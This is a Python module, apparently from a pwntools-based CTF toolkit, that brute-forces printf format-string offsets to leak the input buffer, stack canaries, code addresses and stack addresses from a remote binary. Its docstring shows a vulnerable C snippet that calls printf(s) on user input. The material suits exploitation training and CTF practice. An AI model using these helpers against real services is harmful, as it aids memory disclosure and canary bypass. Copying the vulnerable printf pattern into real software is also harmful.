'''Offset bruteforcers for format string bugs
----------------------------------------------
note: 'offset' refers to the `n` in
    %n$m
when dealing with printf exploitation.
----------------------------------------------
To use any of the functions here, you should
predefine a function that fsb.find_offset can
interact with. If a binary has code like:

    int main(){
        char s[200];
        fgets(s, 199, stdin);
        printf(s);
    }

fsb.find_offset needs a function that can
abstract away the i/o of the binary:

    def printf_io(send: str) -> bytes:
        r = remote(...)
        r.send(send)
        return r.recvline()

Then, we can use the io function to find, e.g.
the offset of the stack canary:

>>> fsb.find_offset.canary(printf_io)
31
'''
from re import findall
from functools import wraps
from pwnlib.log import getLogger
from pwnlib.context import context
from pwnlib.util.cyclic import cyclic, cyclic_find
from pwnlib.util.packing import p32
from pwnscripts import config
from pwnscripts.string_checks import extract_first_hex, is_canary, attrib_set_to
log = getLogger('pwnlib.exploit')

def _sendprintf(requirement):
    @wraps(requirement)
    def inner(sendprintf) -> int:
        for i in range(config.PRINTF_MIN, config.PRINTF_MAX):   # an unaligned printf will fail here
            payload = 'A'*8 + '%{}$p\n'.format(i)
            #with attrib_set_to(context, 'log_level', 'WARN') as _:  # leave quieting to user
            extract = extract_first_hex(sendprintf(payload))    # expect @context.quiet here
            if context.log_level == 'DEBUG':
                print('pwnscripts: extracted %d' % extract)
            if extract == -1: continue
            if requirement(extract):
                log.info('offset for %r: %d' % (requirement.__name__, i))
                return i
        raise RuntimeError
    return inner

@_sendprintf
def _buffer(resp) -> int:
    expected = (0x41414141 if context.arch == 'i386' else 0x4141414141414141)
    return expected == resp

def buffer(sendprintf, maxlen=20) -> int:
    '''Bruteforcer to locate the offset of the input string itself.
    i.e. if buffer() returns 6,
        printf("%6$d") gives the value of p32("%6$p")
    `maxlen` refers to the maximum length of the input. If no value
    is given, the program assumes maxlen=20.

    Larger values of `maxlen` will allow for faster offset guessing.
    '''
    # Note: if config.PRINTF_MAX becomes really large, this might break
    guess_n = (maxlen-len("0x%10$x\n")) // context.bytes
    # So long as more than 1 guess can be done at a time:
    if guess_n > 1:
        '''Let's say guess_n=3 words worth of cyclic() can be inputted.
        If config.PRINTF_MIN=5, then the first payload ought to be
            cyclic(3*context.bytes) + "0x%{}$x\n".format(5+(3-1))
        because the first guess should be able to catch any offset in the range
            range(config.PRINTF_MIN, config.PRINTF_MIN+guess_n)
        '''
        for offset in range(config.PRINTF_MIN+guess_n-1, config.PRINTF_MAX+guess_n-1, guess_n):
            payload = cyclic(guess_n*context.bytes) + "0x%{}$x\n".format(offset).encode()
            #with attrib_set_to(context, 'log_level', 'WARN') as _:
            extract = extract_first_hex(sendprintf(payload))    # Error will be -1
            if extract != -1 and 0 <= (found := cyclic_find(p32(extract))) < len(payload):
                assert found%8 == 0 # if not, the offset is non-aligned
                log.info('offset for buffer: %d' % (offset-found//8))
                return offset-found//8
        raise RuntimeError  # Give up
    # else: use default bruteforcer
    return _buffer(sendprintf)

@_sendprintf
def code(resp) -> int:
    '''heuristic-based bruteforcer for non-PIE code addresses.
    Simply put, any value matching
        '0x804.{4}' (on i386)
        '0x40.{4}'  (on amd64)
    will be considered a code adderess.'''
    return findall({'i386': '0x804....', 'amd64': '0x40....'}[context.arch], hex(resp)) != []

@_sendprintf
def canary(resp) -> int:
    '''heuristic-based bruteforcer to find the offset of a stack canary.
    
    In particular, a word matching
        word[-1]=='\\0' AND word.count('\\0')==1
        AND NOT looks_like_address()
    will be assumed a canary.
    '''
    return is_canary(resp)

@_sendprintf
def stack(resp) -> int:
    '''heuristic-based bruteforcer to find a stack address

    Pattern matches for 0x7ff.{9} in amd64.
    '''
    if context.arch != 'amd64':
        raise NotImplementedError
    return findall('0x7ff.........', hex(resp)) != []

'''TODO: this thing. Would be useful for e.g. grabbing offset to __libc_start_main_ret in main()
Same principle applies for _offset_PIE, because that can be useful for any non-main .text function.
def find_printf_offset_libc(resp: int, offset: int) -> int:
    \'''printf generic for libc addresses. `offset` is optional.
    Provide `offset` to search for a specific offset.\'''
    return is_libc_address(resp) and offset_match(resp, offset)
'''